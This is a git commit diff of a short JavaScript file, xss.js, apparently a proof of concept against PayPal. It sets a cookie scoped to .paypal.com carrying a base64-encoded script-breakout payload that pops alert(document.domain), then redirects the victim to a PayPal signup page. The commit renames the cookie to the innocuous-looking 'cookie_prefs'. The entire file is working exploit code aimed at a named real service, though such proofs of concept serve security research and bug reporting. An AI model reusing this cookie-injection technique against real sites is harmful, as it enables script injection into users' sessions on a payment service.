8a84a37d6d44dbb57188455067bec7d5c9768cd0
TitaniumPikaNinj <62582561+TitaniumPikaNinj@users.noreply.github.com>
2021-07-02 09:07:14 -0700

    Update xss.js

--- xss.js
+++ xss.js
@@ -1,5 +1,5 @@
 ('<h1>Click the button below to continue.</h1><input type="submit" value="Click Me" onclick=setCookieRedir() />');
 function setCookieRedir(){
-      document.cookie = "vulnerableCookie=LS0+PC9zY3JpcHQ+PHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pOy8v;path=/;domain=.paypal.com;";
+      document.cookie = "cookie_prefs=LS0+PC9zY3JpcHQ+PHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pOy8v;path=/;domain=.paypal.com;";
 window.location = "https://paypal.com/bizsignup/#/checkAccount";
 }
